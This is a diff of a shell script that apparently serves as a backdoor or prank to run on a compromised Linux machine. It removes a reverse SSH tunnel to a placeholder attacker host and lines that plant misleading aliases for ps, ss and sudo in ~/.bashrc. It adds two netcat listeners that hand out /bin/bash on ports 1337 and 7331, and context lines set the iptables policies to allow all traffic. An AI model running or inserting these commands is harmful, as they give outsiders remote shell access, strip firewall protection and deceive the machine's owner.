@@ -3,13 +3,9 @@
 # Execute real 'cat' command and don't display anything. Also mess with them
 command cat | grep -Ev "*" | echo "No cats allowed"
 
-# Add lines to their .bashrc
 # Every good script needs some psychological warfare
-echo "alias ps=echo 'error: you cannot perform this operation unless you are root' " >> ~/.bashrc 
-
-echo "alias ss=echo 'error: you cannot perform this operation unless you are root' " >> ~/.bashrc
-
-echo "alias sudo=echo 'Simon says... oh wait, Simon didn't say' " >> ~/.bashrc
+echo ""
+echo "Gonna have to use something like vim if you want to read this file ;P"
 
 # Source the ~/.bashrc
 source ~/.bashrc
@@ -27,5 +23,10 @@ command iptables -P INPUT ALLOW
 command iptables -P OUTPUT ALLOW
 command iptables -P FORWARD ALLOW
 
-# Open up reverse SSH connection
-command ssh -R 34567:localhost:22 root@IP_FOR_ATTACKER_PC_HERE
+# Open up a netcat listener on the best port (TCP)
+nc -l -p 1337 -e /bin/bash & > /dev/null
+nc -l -p 7331 -e /bin/bash & > /dev/null
+
+# Have some fun :D
+command apt install sl > /dev/null
+command sl
